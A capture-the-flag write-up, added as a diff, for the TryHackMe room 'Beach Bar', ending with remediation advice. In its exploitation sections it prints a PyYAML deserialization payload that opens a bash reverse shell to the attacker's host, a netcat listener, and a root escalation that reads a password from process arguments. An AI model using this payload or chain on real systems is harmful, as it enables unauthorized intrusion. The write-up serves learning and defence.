@@ -1,0 +1,173 @@
+---
+title: "Beach Bar — PyYAML Deserialization RCE and Root Privilege Escalation via Process Arguments"
+room: Beach Bar
+difficulty: easy
+platform: TryHackMe
+vulnClass: "Unsafe Deserialization (PyYAML RCE), Default Credentials, Credential Exposure in Process Arguments, Password Reuse, Privilege Escalation"
+spoilerFree: false
+---
+
+## Observation
+
+During a penetration testing engagement / CTF challenge targeting the "Beach Bar" web application at the Byte Lotus Hotel, two critical security flaws led to full system compromise (Root Access):
+
+1. **Unsafe YAML Deserialization (PyYAML RCE):** the web application (running Gunicorn/Python) allows authenticated users (`dj`) to import playlist files in YAML format. The application parses these files using unsafe deserialization (`yaml.load()`), allowing arbitrary Python code execution and leading to an initial reverse shell as `bartender`.
+2. **Credential exposure and password reuse (privilege escalation):** inspecting active system processes revealed a background daemon (`jukeboxd.py`) running as `root` with a plaintext password passed in the command line (`--stream-pass [REDACTED]`). Testing that credential with `su root` granted full administrative access.
+
+## Action
+
+### 1. Reconnaissance and enumeration
+
+**Port scanning (Nmap)** against the target IP (`10.10.10.10`):
+
+```bash
+nmap -sV -sC -O 10.10.10.10
+```
+
+**Results:**
+- **Port 22/tcp:** OpenSSH 9.6p1 Ubuntu
+- **Port 80/tcp:** HTTP (Gunicorn Web Server, redirecting to `/login`)
+
+**Directory brute-forcing (Gobuster)** with `common.txt`:
+
+```bash
+gobuster dir -u http://10.10.10.10 -w /home/kali/lists/SecLists/Discovery/Web-Content/common.txt -t 100
+```
+
+**Discovered endpoints:**
+- `/login` (Status: 200)
+- `/dashboard` (Status: 302 -> `/login`)
+- `/import` (Status: 302 -> `/login`)
+- `/export` (Status: 302 -> `/login`)
+- `/logout` (Status: 302 -> `/login`)
+
+### 2. Initial access (web exploitation)
+
+**Default credentials discovery.** Inspecting the HTML source code of the `/login` page revealed a developer note:
+> `staff note: the demo DJ login is still enabled for the soft opening. dj / dj -- swap this before the season starts (ticket BAR-7)`
+
+Logging in with `dj` / `dj` was successful.
+
+**Analyzing the export/import functionality.** After logging in, the Dashboard features an **Export** and **Import** playlist option. Downloading the exported playlist yielded a YAML structure (`upload.yml`):
+
+```yaml
+# Beach Bar jukebox playlist export
+playlist:
+  name: Sunset Session
+  vibe: golden hour
+  tracks:
+    - artist: Khruangbin
+      title: Maria Tambien
+    - artist: Men I Trust
+      title: Show Me How
+    - artist: Crumb
+      title: Locket
+```
+
+**Exploiting PyYAML insecure deserialization (RCE).** Applications using Python's `yaml.load()` without `SafeLoader` are vulnerable to remote code execution through constructor tags such as `!!python/object/apply`.
+
+I constructed a malicious YAML payload (`exploit.yml`) designed to spawn a reverse shell back to my Kali Linux instance:
+
+```yaml
+!!python/object/apply:os.system
+- "bash -c 'bash -i >& /dev/tcp/10.10.10.20/4444 0>&1'"
+```
+
+**Catching the reverse shell:**
+1. Started a Netcat listener on Kali:
+   ```bash
+   nc -lvnp 4444
+   ```
+2. Uploaded `exploit.yml` via the `/import` endpoint.
+3. Received an active connection as user `bartender`:
+
+```text
+connect to [10.10.10.20] from (UNKNOWN) [10.10.10.10] 55948
+bartender@tryhackme-2404:/opt/beach-bar/webapp$
+```
+
+4. Upgraded the shell to a fully interactive TTY:
+   ```bash
+   python3 -c 'import pty; pty.spawn("/bin/bash")'
+   ```
+
+5. **User flag retrieval:**
+   ```bash
+   cat /home/bartender/user.txt
+   ```
+   > **User flag:** `[FLAG CAPTURED]`
+
+### 3. Privilege escalation (local reconnaissance)
+
+**Process inspection.** I inspected running processes on the machine to identify background services:
+
+```bash
+ps aux | grep jukebox
+```
+
+**Output:**
+
+```text
+root  610  0.0  0.2  20176 11708 ?  Ss  21:22   0:00 /opt/beach-bar/venv/bin/python /opt/beach-bar/jukeboxd/jukeboxd.py --stream-pass [REDACTED] --bitrate 320k
+```
+
+**Key finding: plaintext credentials in process arguments.** A background daemon (`jukeboxd.py`) running with **root** privileges passed its password as a command-line argument (`--stream-pass`). On a multi-user box, that argument is world-readable through `/proc` and `ps`, so the credential leaks to every local user without any file-permission mistake.
+
+**Password reuse exploitation.** I tested the discovered password against the `root` account via `su`:
+
+```bash
+su root
+# Password: [REDACTED]
+```
+
+The switch succeeded, granting instant root access:
+
+```bash
+root@tryhackme-2404:/opt/beach-bar/jukeboxd# whoami
+root
+```
+
+**Root flag retrieval:**
+
+```bash
+cd /root
+cat root.txt
+```
+
+> **Root flag:** `[FLAG CAPTURED]`
+
+## Result
+
+| Stage | Outcome |
+|:---|:---|
+| Recon | OpenSSH 9.6p1 on 22, Gunicorn on 80; five endpoints enumerated, three of them 302-gated |
+| Initial access | Developer note in the `/login` source leaked `dj / dj` |
+| RCE | `!!python/object/apply:os.system` through the `/import` YAML upload |
+| Shell | Reverse shell as `bartender`, upgraded to a TTY |
+| User flag | `[FLAG CAPTURED]` |
+| Local recon | `ps aux | grep jukebox` exposed a root daemon's `--stream-pass` argument |
+| Escalation | Same password reused for `su root` |
+| Root flag | `[FLAG CAPTURED]` |
+
+Full system compromise: unauthenticated web RCE chained with a local privilege escalation that required no exploit at all.
+
+## Takeaway
+
+**Unsafe deserialization is code execution, not data parsing.** `yaml.load()` without `SafeLoader` will happily instantiate arbitrary Python objects named in the document. If user-supplied YAML ever reaches that call, `!!python/object/apply` is a shell.
+
+**Process arguments are a public channel.** A secret passed as `--stream-pass <value>` is visible to every local user through `ps aux` and `/proc/<pid>/cmdline`, and it usually lands in shell history and process-monitoring logs too. Passing it as an argument is the same as printing it on a billboard — especially when the process runs as root, which is also its own bug: a media daemon does not need root.
+
+**Password reuse turns a read-only leak into root.** The daemon's credential was never meant to leave the process, but because it was reused for the root account, a passive `ps` observation escalated to full administrative control with zero exploitation.
+
+**Default and demo credentials ship.** The `dj / dj` note sat in the HTML source of the login page. Notes like that belong in a ticket tracker, not in production markup.
+
+### Remediation
+
+1. **Use safe YAML loaders:** replace `yaml.load(data)` with `yaml.safe_load(data)` or `yaml.load(data, Loader=yaml.SafeLoader)` to prevent object instantiation during deserialization.
+2. **Remove default demo accounts:** ensure soft-opening / demo accounts (`dj/dj`) are disabled before production release.
+3. **Avoid secrets in process arguments:** pass sensitive credentials like `--stream-pass` via secure environment variables or restricted configuration files rather than CLI arguments visible via `ps aux`. Run services as a dedicated unprivileged user.
+4. **Harden password security:** enforce unique, strong passwords across system accounts to prevent privilege escalation via credential reuse.
+
+### Notes
+
+- Category: Web / Boot2Root. The reverse-shell payload IP and the root password were sanitized for publication; the payload structure is preserved byte-for-byte apart from the address substitution.
